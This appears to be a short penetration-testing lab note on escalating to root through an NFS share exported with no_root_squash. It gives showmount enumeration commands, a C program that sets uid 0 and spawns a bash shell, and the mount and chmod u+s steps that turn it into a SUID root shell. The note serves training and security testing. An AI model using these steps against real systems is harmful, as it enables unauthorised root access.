
Network File System (NFS) uses TCP/UDP port `2049`. 

```sh
showmount -e 10.129.2.12
### lists the NFS server's export list or accessible mounts

cat /etc/exports
```

When an `NFS` volume is created, various options can be set:

|Option|Description|
|---|---|
|`root_squash`|If the root user is used to access NFS shares, it will be changed to the `nfsnobody` user, which is an unprivileged account. Any files created and uploaded by the root user will be owned by the `nfsnobody` user, which prevents an attacker from uploading binaries with the SUID bit set.|
|`no_root_squash`|Remote users connecting to the share as the local root user will be able to create files on the NFS server as the root user. This would allow for the creation of malicious scripts/programs with the SUID bit set.|

 We can create a SetUID binary that executes `/bin/sh` using our local root user. We can then mount the `/tmp` directory locally, copy the root-owned binary over to the NFS server, and set the SUID bit. Check `cat /etc/exports` for `no_root_squash`.

```c
cat shell.c 

	#include <stdio.h>
	#include <sys/types.h>
	#include <unistd.h>
	#include <stdlib.h>
	
	int main(void)
	{
	  setuid(0); setgid(0); system("/bin/bash");
	}
```

**On attacker's machine:**
```sh
sudo mount -t nfs 10.129.2.12:/tmp /mnt
cp shell.c /mnt ### then compile on victim machine
gcc -static shell.c -o shell ### on victim's machine
chmod u+s /mnt/shell
```

---